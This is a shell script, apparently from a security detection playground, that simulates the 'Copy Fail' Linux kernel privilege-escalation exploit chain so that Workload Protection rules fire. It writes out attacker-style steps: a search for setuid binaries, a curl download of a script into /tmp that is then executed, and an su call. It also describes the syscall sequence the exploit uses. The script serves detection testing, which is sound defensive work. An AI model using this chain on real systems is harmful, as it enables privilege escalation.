#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation - CVE-2026-31431 (Copy Fail)\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates the privilege escalation exploit chain for \
CVE-2026-31431 ("Copy Fail"), a Linux kernel page cache corruption vulnerability \
in the authencesn AEAD template. The real exploit allows an unprivileged user to \
perform a controlled 4-byte write into the page cache of any readable file, \
corrupting setuid binaries to achieve root.

This simulation reproduces the observable syscall sequence — AF_ALG socket bind, \
SOL_ALG setsockopt, and splice from a setuid binary — so that Datadog Workload \
Protection's three-stage chained detection can fire. No actual page cache \
corruption or privilege escalation occurs.\033[0m

\033[1;33mThis exploit simulator is HARMLESS — it emits syscalls only.\033[0m
EOF

step <<EOF
\033[1;35mReconnaissance — Verify Exploit Prerequisites\033[0m

${PURPLE}Before running the exploit, the attacker checks that the AF_ALG kernel \
module is available and identifies a setuid-root target binary. The Copy Fail \
exploit requires: (1) the algif_aead module loaded or loadable, and (2) a \
readable setuid binary like /usr/bin/su or /usr/bin/sudo.\033[0m
EOF
wait_for_confirmation
inject "echo '--- Checking for AF_ALG module ---' && (lsmod 2>/dev/null | grep algif || cat /proc/modules 2>/dev/null | grep algif || echo 'Module check not available in container — exploit still emits syscalls') && echo '--- Locating setuid binaries ---' && find /usr/bin -perm -4000 -type f 2>/dev/null | head -5 || echo 'No setuid binaries found via find — will target /usr/bin/su directly'"

step <<EOF
\033[1;35mExploit Download — Retrieve Copy Fail Simulator\033[0m

${PURPLE}The attacker downloads the exploit script to the compromised web server. \
The real CVE-2026-31431 exploit is a 732-byte Python script. Our simulator \
reproduces the same syscall chain without performing actual page cache corruption.\033[0m
EOF
wait_for_confirmation
inject "curl -o /tmp/copy-fail.py https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/copy-fail/simulate-exploit.py && chmod +x /tmp/copy-fail.py"

step <<EOF
\033[1;35mExploit Execution — Trigger AF_ALG → setsockopt → splice Chain\033[0m

${PURPLE}The attacker runs the exploit. The three-stage detection chain monitors:

  Stage 1: An unprivileged process binds an AF_ALG socket (type "aead",
           algorithm "authencesn(hmac(sha256),cbc(aes))")
  Stage 2: The same process calls setsockopt with SOL_ALG (level 279)
  Stage 3: The same process splices from a setuid binary (/usr/bin/su)

All three stages must occur within the same process in a 30-second window \
for the chained detection to fire.\033[0m
EOF
wait_for_confirmation
inject "python3 /tmp/copy-fail.py"

step <<EOF
\033[1;35mPost-Exploitation — Simulated Privilege Escalation\033[0m

${PURPLE}After the page cache corruption, the attacker would execute the corrupted \
setuid binary to gain root. We simulate this by executing /usr/bin/su (which \
will fail without a real password, but the setuid execution event is visible \
to the suid_file_execution_v2 agent rule).\033[0m
EOF
wait_for_confirmation
inject "echo 'Simulating post-corruption setuid execution...' && su -c 'id' nobody 2>&1 || echo 'su failed as expected — setuid execution event was emitted'"

step <<EOF
\033[1;35mCleanup — Remove Exploit Artifacts\033[0m

${PURPLE}Remove the downloaded exploit script and any temporary files.\033[0m
EOF
wait_for_confirmation
inject "rm -f /tmp/copy-fail.py"

print <<EOF
${GREEN}Simulation completed successfully!\033[0m

${YELLOW}You can now view the signals in the Datadog Workload Protection App.

Expected detections:
  - CVE-2026-31431 Content Pack: AF_ALG splice chain (critical severity)
  - suid_file_execution_v2: setuid binary execution by non-root user\033[0m
EOF
